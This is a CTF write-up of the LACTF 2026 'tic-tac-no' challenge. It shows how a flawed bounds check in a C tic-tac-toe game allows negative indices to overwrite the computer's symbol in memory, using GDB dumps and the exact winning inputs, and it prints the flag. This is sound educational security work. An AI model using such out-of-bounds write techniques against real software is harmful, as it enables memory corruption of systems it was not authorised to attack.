+++
date = '2026-02-07T12:22:47-05:00'
draft = false
title = 'Lactf_tictacno_writeup'
+++

I recently participated in the [2026 LACTF](https://platform.lac.tf/) and had a blast! The specific challenge that I liked was called pwn/tic-tac-no.   

# Overview

We are told to netcat in and get:

```
You want the flag? You'll have to beat me first!
   |   |
---|---|---
   |   |
---|---|---
   |   |

Enter row #(1-3):
```
Pretty self explanatory, you enter the row and column number and it puts the X in said spot and then gives the computer its turn.
```
Enter row #(1-3): 1
Enter column #(1-3): 2

 O | X |
---|---|---
   |   |
---|---|---
   |   |

Enter row #(1-3):
```
Playing enough of this tic tac toe, you find out that its very hard to beat the other player, practically having a tie or losing everytime.

# Analysis

```c {style=gruvbox}
char board[9];
char player = 'X';
char computer = 'O';
```
At the top of the file is the board list and the respective players. 
```c {style=gruvbox}
void initializeBoard();
void printBoard();
int checkWin();
int checkFreeSpaces();
void playerMove();
void perfectComputerMove();
int minimax(char board[9], int depth, bool isMaximizing);
```
Then there is a bunch of functions, the top are mainly to setup the board and display it, then logic to check the win condition, move the player and then the algorithm used by the computer. The algorithm is called [MiniMax](https://en.wikipedia.org/wiki/Minimax) which works by playing out every single possible move by both the computer and player and assigning a score to each move, then picks the best score to move. It is looking into every possible future and picks the best one. Its so simple that it can't entirely be described as AI. This well works because the board state is finite and quite limited, making computation quick. This can exist for chess too, but it has to be limited in its depth ( how many nested futures it can look ) because there are more chess board combinations than atoms in the observable universe.<br><br>
Logic for the player, which gives you a big score and tries to minimize it.
```c {style=gruvbox}
      int bestScore = 1000;
      for (int i = 0; i < 9; i++) {
         if (board[i] == ' ') {
            board[i] = player;
            int score = minimax(board, depth + 1, true);
            board[i] = ' ';
            if (score < bestScore) {
               bestScore = score;
            }
         }
```
Logic for the computer, which gives it a low score and then tried to maximize it by trying every move.
```c {style=gruvbox}
      int bestScore = -1000;
      for (int i = 0; i < 9; i++) {
         if (board[i] == ' ') {
            board[i] = computer;
            int score = minimax(board, depth + 1, false);
            board[i] = ' ';
            if (score > bestScore) {
               bestScore = score;
            }

```


# Beat MiniMax?

Maybe this algorithm is limited in depth too? The code seems to recurse forever, but who knows? Lets test it.

A really good resource I found during that time was this [Quora Answer](https://www.quora.com/Is-there-a-way-to-never-lose-at-Tic-Tac-Toe) for the question "Is there a way to never lose at Tic-Tac-Toe?". Now based off that, if the algorithm blocks us from doing any of the possible moves described, it's impossible. <br><br>

Trying center:
```
 O |   |
---|---|---
   | X |
---|---|---
   |   |

 O |   | O
---|---|---
   | X |
---|---|---
   |   | X
```

Doesn't seem to work, it will always fill up the side opposite to the side we played in, to hopefully score a vertical or horizontal win.
And testing all of the answers from Quora, it seems that it plays them perfectly :(
<br>
Even being so simple, this algorithm is quite literally **mathematically impossible** to beat. Check out this [blog](https://www.neverstopbuilding.com/blog/minimax) for more details.

# Out of bounds?

Ok, so we can't beat this. Maybe the source code has something, maybe its an traditional pwn challenge rather than some odd math problem for the steps.<br>
When I played around with this, I entered the number 11 by accident and somehow it worked.

```
You want the flag? You'll have to beat me first!
   |   |
---|---|---
   |   |
---|---|---
   |   |

Enter row #(1-3): 11
Enter column #(1-3): 1

 O |   |
---|---|---
   |   |
---|---|---
   |   |

```
You can't actually see it, but it must have overwritten something.

Cutting to the important lines. I looks like they do have a bounds check but its bad, it doesn't let us write over the computer's tiles and most importantly, it never enforces the bounds at all for **us**.

```c 
if(index >= 0 && index < 9 && board[index] != ' '){
   printf("Invalid move.\n");
}else{
   board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board <-- comment by chall maker
   break;
}
```

It never was safe. Its right that we can't steal claimed tiles, yet we have a **out-of-bounds memory write!!!** because the board list declared above is of size 9.


# Lets pull out GDB

Reminder of the order of how its declared, we can assume that the board will be close to the memory addresses of the player and computer variable.
```c
char board[9];
char player = 'X';
char computer = 'O';
```
Indeed, GDB confirms this:

```bash
0x555555558050 <player>:        88 'X'  79 'O'  0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x555555558058 <stdout@GLIBC_2.2.5>:    -64 '\300'      -43 '\325'      -33 '\337'      -9 '\367'       -1 '\377'       127 '\177'      0 '\000'        0 '\000'
0x555555558060 <completed.0>:   0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x555555558068 <board>: 79 'O'  32 ' '  32 ' '  32 ' '  32 ' '  32 ' '  32 ' '  32 ' '
0x555555558070 <board+8>:       32 ' '  0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
```
There they are, both the player and computer variables at `88 'X'  79 'O'`, below them is standard GLIB stuff we can choose to ignore, and further from that is our board.

# Game Plan

If we can overwrite the computer's variable with an 'X', the computer will playing for us, letting us win easily.
This can be confirmed because the checkWin function, even if it looks complex, just does multiple string comparisons, nothing more.
```c
int checkWin() {
   for (int i = 0; i < 3; i++) {
      if (board[3*i] == board[3*i+1] && board[3*i] == board[3*i+2] && board[3*i] != ' ')
         return board[3*i]; 
   }
   for (int i = 0; i < 3; i++) {
      if (board[i] == board[3+i] && board[i] == board[6+i] && board[i] != ' ')
         return board[i];
   }
   if (board[0] == board[4] && board[0] == board[8] && board[0] != ' ')
      return board[0];
   if (board[2] == board[4] && board[2] == board[6] && board[2] != ' ')
      return board[2];

   return ' ';
}
```

Since we want to move back in memory, we need to enter negative values, which the bounds check doesn't care about. After some trial and error, we gradually move back until we hit the computer's variable.

# Win!
```
Enter row #(1-3): -4
Enter column #(1-3): -7

   |   |
---|---|---
   | X |
---|---|---
   |   |

Enter row #(1-3): 1
Enter column #(1-3): 1

 X |   |
---|---|---
   | X |
---|---|---
   |   | X
```
At row -4 and column -7, we successfully corrupt the computer's variable, making it play for us.
<br> GDB:
```bash
0x555555558050 <player>:        88 'X'  88 'X'  0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
```
And we got it, `How's this possible? Well, I guess I'll have to give you the flag now.`!
`lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`




